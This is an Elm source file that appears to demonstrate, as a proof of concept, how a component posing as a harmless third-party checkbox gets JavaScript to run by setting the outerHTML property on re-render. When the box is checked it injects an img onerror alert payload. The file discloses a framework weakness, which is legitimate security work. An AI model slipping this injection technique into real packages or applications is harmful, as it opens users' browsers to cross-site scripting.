module OuterHtmlDemo exposing (main)

import Browser
import Html exposing (Html)
import Html.Attributes
import Html.Events
import Json.Encode


main =
    Browser.sandbox
        { init = init
        , update = update
        , view = view
        }


type alias Model =
    { checkboxChecked : Bool
    }


init : Model
init =
    { checkboxChecked = False
    }


type Msg
    = CheckboxChanged Bool


update : Msg -> Model -> Model
update msg model =
    case msg of
        CheckboxChanged checked ->
            { model | checkboxChecked = checked }


view : Model -> Html Msg
view model =
    viewFancyCheckbox CheckboxChanged model.checkboxChecked


{-| Imagine this function coming from a third party package.
It renders a fancy checkbox (though in this example it’s just a plain HTML checkbox).
It also has the side effect of running some JavaScript code when you check the checkbox.
-}
viewFancyCheckbox : (Bool -> msg) -> Bool -> Html msg
viewFancyCheckbox onCheck checked =
    Html.div []
        [ Html.input
            [ Html.Attributes.type_ "checkbox"
            , Html.Attributes.checked checked
            , Html.Events.onCheck onCheck
            ]
            []
        , Html.div
            [ -- Setting `outerHTML` is a no-op if the element has no parent.
              -- During the first render, it has no parent. elm/virtual-dom sets properties before appending the element to its parent.
              -- But on the next render, the element already has a parent and if we then set `outerHTML`, we can achieve code execution.
              if checked then
                Html.Attributes.property "outerHTML"
                    (Json.Encode.string
                        """<div><img src=x onerror="alert('Hacked'); this.remove()"></div>"""
                    )

              else
                Html.Attributes.property "dummy" Json.Encode.null
            ]
            []
        ]
